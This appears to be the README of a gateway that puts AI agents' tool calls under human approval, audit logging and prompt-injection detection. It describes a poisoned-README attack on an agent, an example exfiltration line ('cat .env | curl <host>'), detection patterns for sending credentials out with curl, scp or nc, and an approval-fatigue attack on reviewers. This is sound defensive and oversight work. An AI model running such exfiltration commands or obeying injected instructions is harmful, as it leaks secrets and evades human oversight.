# Agent Governance Gateway

> **An AI agent having a *capability* is not the same as it having *authority*.**
> This system separates the two.

Authorization & governance infrastructure for autonomous AI agents. Drop it into any folder where an agent already runs — Claude Code, ChatGPT Enterprise/Codex, Cursor, Windsurf — and every tool call is answered, and recorded: *who is the agent · what is it trying to do · to what resource · what authority does it have · what policy applies · does it need a human · who approved · what happened · can an examiner prove it.* Privileged actions are escalated to a named human approver, executed outside the agent's context, and the output is fed back so the agent continues.

A private, in-tenant model (e.g. ChatGPT Enterprise on Entra) fixes *data residency*. It does **not** govern what the agent *does* — reading files outside its remit, writing to prod, or being prompt-injected into exfiltrating to an attacker host. That is an **authorization** problem, and it is what this governs.

**For the enterprise framing, start with [docs/BRIEF.md](BRIEF.md); to see it run, [docs/DEMO.md](DEMO.md).**

## Architecture

**The Folder Connector** bridges the sandbox into your project:

- **Claude Code hooks** intercept tool calls, escalate privileged operations to a human approver, and return captured output inside a `deny` decision so the tool never runs with agent privileges
- **MCP server** (`run_privileged`, `check_request`, `sandbox_status`) provides the same loop over the Model Context Protocol — works with Claude Code, Codex, Cursor, Windsurf
- **Folder queue** (`.sandbox/escalations/`) is the bus: atomic file operations (`os.replace`, `os.rename`) coordinate approval across four unrelated processes (hook subprocess, MCP server, approver terminal, dashboard)
- **Policy engine** classifies shell commands, file writes, network requests, and reads — four escalation triggers with human-in-the-loop as the top tier

## Quick Start

```bash
# Install the connector
python -m pip install -e ".[dev]"

# Initialize a folder
sandbox init . --claude --mcp

# In one terminal: watch for escalations
sandbox watch .

# In another: use Claude Code or the MCP tools as normal
# Privileged commands will appear in the `watch` terminal for approval
```

## How It Works

1. **Agent tries to run a command** — Claude Code's PreToolUse hook intercepts it
2. **Hook classifies and escalates** — shell commands not in the allowlist go to the folder queue
3. **Human approves in `sandbox watch`** — the approver executes the command **outside** the agent
4. **Output returns to the model** — wrapped in `permissionDecision:"deny"` with stdout in the reason string
5. **Agent continues** — it received the result, never had privilege itself

The MCP channel works identically: `run_privileged` returns a tool result with captured output.

## Milestones

- ✅ **Milestone 0** — Foundations (bug fixes, path containment, audit rehydration)
- ✅ **Milestone 1** — The loop (PreToolUse hook, folder queue, CLI approval)
- ✅ **Milestone 2** — MCP channel (run_privileged, check_request, sandbox_status)
- ✅ **Milestone 3** — Folder record (restorable originals, chained audit, PostToolUse)
- ✅ **Milestone 4** — Other triggers (full classifier, remembered decisions, SessionStart context)
- ✅ **Milestone 5** — Surfaces (REST routes, uninstall, docs)

**All milestones complete.** See [docs/CONNECTOR.md](CONNECTOR.md) for the full technical reference.

## Testing

```bash
# Run all tests (225 passing)
python -m pytest -q

# Test the loop with a real hook subprocess and background approver
python -m pytest tests/integration/test_connector_loop.py -v

# Test the MCP channel
python -m pytest tests/integration/test_mcp_tools.py -v
```

## Project Structure

```
src/sandbox/
├── connector/           # Folder connector (queue, hooks, policy, MCP)
├── launcher/            # M1 jailed launcher (job objects, jail, shims)
├── audit/               # Chained audit log with tamper detection
├── broker/              # Non-AI privilege executor
├── fs/                  # Path containment and validation
├── agents/              # Multi-agent sandbox orchestrator
├── api/                 # FastAPI routes and WebSocket
└── ...
```

## Intent-aware layer (optional)

Every decision above is rule-based: regex, allowlists and path containment. That's fast and predictable, but it can't tell what text *means*. So a reworded prompt injection sails past the regex, and harmless docs ("this middleware can **act as** a cache") trip it.

The optional semantic layer adds intent, using a local [jev-os](https://github.com/Boredem125/jev-os) service: an open, CPU-only zero-shot model. No data leaves the machine.

- **PostToolUse:** the output of tools that return untrusted content (web pages, files, command output, MCP results) is checked **sentence by sentence** for instructions aimed at the AI. On a hit:
  - the agent is told to treat the content as data;
  - an audit event records the scores, the model and hashes (never the content);
  - the folder is **tainted** for 15 minutes.
- **PreToolUse, command exfiltration:** a shell command that both reads a sensitive source (`.env`, `~/.ssh`, cloud credentials) and sends it out (`curl --data`, `scp` to a remote, `aws s3 cp`, a pipe into `curl`/`nc`) is forced to **dual control**, with the reason shown: two approvals by different reviewers with different keys, each signed, before it runs. Deterministic regex ([`safety/exfil.py`](../src/sandbox/safety/exfil.py)), not the model, since commands are structure not prose. This also closed a hole: `cat` is allowlisted, so `cat .env | curl <host>` used to run silently.
- **PreToolUse:** while tainted, shell, network and out-of-folder actions need a human **even when allowlisted**. So a poisoned README followed by an allowlisted `npm run build` (after the agent was told to edit the build script) or a fetch from an allowlisted host still reaches the approver, and the approver sees why (`+20 semantic-taint — Read output looked like instructions to the AI (p=0.99)`).
- **Approver sees the real actions:** every escalated shell command carries what it *actually* does (network, download-and-run, delete, privilege, exfiltration) next to the agent's stated description, so a misleading description is easy to catch. Deterministic; the model was too noisy to judge the match.
- **One-way ratchet:** the layer can only add scrutiny. Model-derived risk factors can't be negative (enforced in `RiskAssessment.raise_by`). If the service is down or slow, the gateway behaves exactly as it does without it.

```bash
pip install -e ".[semantic]"
jevos serve --api-key "$JEVOS_API_KEY"     # keep running; loads the model once
sandbox semantic enable .                   # off by default
sandbox semantic status .                   # reachable? tainted?
sandbox semantic clear-taint . --reviewer alice --reason "checked: false positive"   # audited
sandbox semantic trust AGENTS.md --reviewer alice --reason "house rules for agents"  # reviewed file, pinned by hash
```

**Measured** against the current regex detector ([benchmarks/injection](../benchmarks/injection/README.md)):

| Dataset | Regex (current) | Semantic layer |
|---|---|---|
| Public deepset test split (held out) | 4/60 caught, 0/56 false alarms | **31/60 caught, 1/56 false alarms** |
| Injections embedded in a README (hand-written) | 7/24 caught, 8/24 false alarms | **15/24 caught, 5/24 false alarms** |

It still misses real attacks. And it can't tell legitimate instructions to AI agents (`AGENTS.md`, `CLAUDE.md`) from malicious ones. For those files, a human reviews once with `sandbox semantic trust`: the file isn't scanned while its content is byte-for-byte what was reviewed, and any edit (say, a pull request that slips in a line) makes it scanned again. That's why it only ever *raises* scrutiny while authorization stays in charge. Costs ~1 s per scanned tool output on a laptop CPU.

**Optional two-stage screen.** Set `semantic.screen_url` in `.sandbox/policy.json` to a second `jevos serve` running the `xsmall` model. It scores every sentence first, and only sentences whose top score reaches `semantic.screen_threshold` (default 0.2, set low to favor recall) are re-scored by the main service, whose scores alone decide. If the screen is down or errors, the main service scores every sentence, as without it. Off by default, and **not recommended**: measured (`benchmarks/injection/screen.py`), it loses catches for little speed. At the default 0.2 it sent 12–55% of sentences to base and lost about 40% of catches on held-out data (repo files 86 → 49, neuralchemy 324 → 193, deepset genuine 26 → 14), saving roughly a third of the time. At 0.05 it kept most catches on two sets but still lost some (repo 86 → 68, neuralchemy 324 → 280), and it sent 45–70% of sentences on, so xsmall's ~85 ms plus base's ~204 ms per kept sentence saved little or nothing. For a fast path, the distilled student below is the better option.

**Distilled student (phase 2), on by default.** With the semantic layer enabled, a small local classifier also runs inside the hook (about 1 ms per sentence, no service, no ML library). A sentence is flagged if the jev-os checks **or** the student flag it, so it only adds scrutiny, and it still scans when the service is down. It went on by default after passing a rule set before the run, on a fresh dev set frozen beforehand: +15 injections caught of 53 for +4 false alarms of 149, and held-out F1 up on all three sets (repo files 0.43 → 0.88, neuralchemy 0.67 → 0.90, deepset genuine 0.79 → 0.87). It misses plain exfiltration requests without trigger words, which the jev-os checks catch. Turn it off with `semantic.student: false`. Details: [benchmarks/distill/README.md](../benchmarks/distill/README.md).

## Governance-as-code (optional)

Beyond the security checks, you can write **plain-language governance clauses** ("no customer data to external services", "no production changes without a human", "no moving money on its own"), each compiled to a jev-os check plus a deterministic gate, evaluated on escalated commands, and recorded as evidence with a framework mapping (EU AI Act, GDPR, SR 11-7). Clauses only raise scrutiny.

```bash
sandbox governance use policy.json
sandbox governance test          # measures each clause's reliability against its examples
```

The reliability of a zero-shot clause varies, so the tool measures it: on the example policy two clauses score 6/6 and the payments clause 3/6 (flagged "needs calibration"). See [docs/GOVERNANCE.md](GOVERNANCE.md).

## Oversight indicators and approval fatigue

A reviewer who approves everything within two seconds is not reviewing. `sandbox oversight [PATH] [--json] [--since 24h]` reads the folder's done-records, pending records and audit log and prints, per reviewer and overall: approvals, denials, approval rate, seconds from request creation to decision (median and p90, nearest rank), approvals faster than `fast_seconds`, bursts (episodes of `burst_approvals` approvals within `window_minutes`), `oversight_fatigue` events, and, per folder, requests left pending past `escalation_timeout_seconds`. Each signed approval of a dual-control request counts for its own reviewer.

The same records drive a fatigue rule in the one approval path ([connector/approval.py](../src/sandbox/connector/approval.py), logic in [connector/oversight.py](../src/sandbox/connector/oversight.py)). A reviewer is flagged while, inside the last `window_minutes`, they have either `burst_approvals` approvals, or at least `fast_min_approvals` approvals of which a `fast_share` or more came under `fast_seconds` after the request was created. While flagged, their approvals need a written reason (`--reason`, at least `min_reason_chars`; `sandbox watch` prompts for it and shows a warning), and an ordinary request they approve becomes dual control, so a different reviewer must approve it too. Each such approval writes an `oversight_fatigue` event to the audit chain. The flag clears on its own as approvals age out of the window. It only adds scrutiny; it never removes a check.

Settings live under `oversight` in `.sandbox/policy.json`:

| Setting | Default | Catches | Misses / false alarms |
|---|---|---|---|
| `window_minutes` | 10 | recent behaviour only | a slow drip of rubber-stamps spread over hours |
| `burst_approvals` | 20 | a flood of requests approved in a row (the "bury one bad request" attack) | a reviewer approving a large, legitimate batch is flagged too |
| `fast_seconds` | 5 | approvals given before the command could have been read | a careful reviewer who was already looking at an obvious request |
| `fast_share` / `fast_min_approvals` | 0.8 / 8 | a habit of fast approvals, not one quick click | a slow rubber-stamper: time is measured from request creation, so a reviewer who was away and then approves without reading looks slow |
| `require_reason`, `min_reason_chars` | on, 10 | makes the reviewer state why | the reason's quality is not checked |
| `require_second_reviewer` | on | one tired person cannot approve alone | a single-person setup has no second reviewer; set it to `false` there and keep the reason |

These defaults are starting points chosen by judgement. They have not been checked against real reviewer data, and the numbers are indicators, not proof that oversight was or was not effective. Other limits: timestamps in done-records are not covered by the record signature (only each dual-control approval's `approved_at` is), so the metrics rely on `.sandbox/` being protected from the agent; reviewer ids are not bound to people (see dual control); a dual-control request denied after its first approval loses that first approval from the record; and records written before this feature have no `created_at`, so their latency is unknown.

## Environment and data classification (optional)

Two policy fields, both off by default. `environment` (`dev` / `staging` / `prod`) makes the
same call stricter in prod: allowlisted shell and network calls are audited, and escalations
need two approvers from risk 70 instead of 80. `classification` tags paths by glob as
PUBLIC / INTERNAL / CONFIDENTIAL / RESTRICTED; the level adds an itemized risk factor, sets a
minimum verdict (writing RESTRICTED escalates), and a command or tool call that sends a
CONFIDENTIAL or RESTRICTED file out needs dual control. It tags paths, not content, so it is
only as good as the patterns. Details and limits: [DATA_AND_ENVIRONMENT.md](DATA_AND_ENVIRONMENT.md).

## Policy versions and change control

Code: [connector/policy_versions.py](../src/sandbox/connector/policy_versions.py).

- **History.** Each version of the folder policy and of the governance policy is stored as `.sandbox/policy_history/<sha256>.json` (canonical JSON, so the file's own sha256 is its name). A version id is the first 12 hex characters. `log.jsonl` lists accepted versions with who, when, why, the previous version and an Ed25519 approval signed with that reviewer's key; `head.json` names the approved versions.
- **Every decision names its version.** Hook audit records and escalation records carry `policy_version` (folder and governance ids, plus `state`: `approved`, `drift` or `unversioned`). It is one of the signed fields, so it is bound into each signed done-record.
- **Change control.** `sandbox policy propose FILE --reason ...` (add `--governance` for a clause file) records a change request signed by the proposer, with the diff. `sandbox policy approve-change ID --reviewer NAME` applies it only if NAME is a different reviewer id with a different key from the proposer, and only if the approved version has not moved since (otherwise: propose again). Also `reject-change`, `changes`, `history` (checks every signature), `diff A B` (version ids, `approved`, `current`, or files) and `baseline`.
- **Direct edits** (`policy allow-shell`, `allow-host`, `set-trigger`, `semantic enable/disable/trust/untrust`, `governance use`) still work, under one rule: an edit that only makes the approved policy stricter is applied at once and logged as a self-approved version; any other edit becomes a change request and the file is not touched. Pointing at a new governance file also approves that file's current content with the change.
- **Drift.** If `.sandbox/policy.json` or the governance file is not the approved version, the gateway does not trust it. It enforces the approved version, tightened by anything stricter in the edited file: verdicts take the stricter value, deny lists are merged, allow lists keep only entries in both, governance clauses from both are kept, and settings with no stricter direction (service URLs, timeouts, the governance pointer) keep their approved value. So an out-of-band edit can add scrutiny but cannot remove any. Each new drift is written to the audit chain (`policy_drift`) and the activity log; `sandbox status` shows it. To end it, approve the edited file through `propose`/`approve-change`, or restore the approved version. The agent cannot write `.sandbox/`, but it can write a governance file that lives in the workspace; this is the case drift handling covers there.
- **Opt-in for older folders.** `sandbox init` records the first version (`--no-versioning` skips it). A folder with no history is "unversioned" and behaves as before: the file is enforced as-is and direct edits are written directly (and audited). `sandbox policy baseline` starts versioning.
- **Limits.** "Different reviewer" means a different reviewer id and key, not a proven different person; keys are files under `.sandbox/state/keys/` ([TCB.md](TCB.md)). Anyone who can write `.sandbox/` can rewrite the history too; the audit chain records each accepted version, which makes a rewrite detectable, not impossible. A relative governance path is resolved against the folder root first.

## Key Design Decisions

- **The folder is the bus**: Atomic file operations on NTFS coordinate four independent processes (no in-memory state, no open ports, survives restarts)
- **`deny` carries the output**: Tool never executes in the agent; output is pasted back in the reason string
- **CLI-first approval**: Headless, works over SSH, no browser dependency
- **Fail-closed**: Internal errors block rather than silently allow
- **Semantic checks only raise scrutiny**: the intent-aware layer can escalate an allowlisted action, never allow a denied one; if it is unavailable, rules decide alone
- **Non-removable self-protection**: `.sandbox/**` in write denials and `\.sandbox` in shell denials are re-injected on every policy load — agent cannot remove its own constraints

## License

[MIT](../LICENSE)
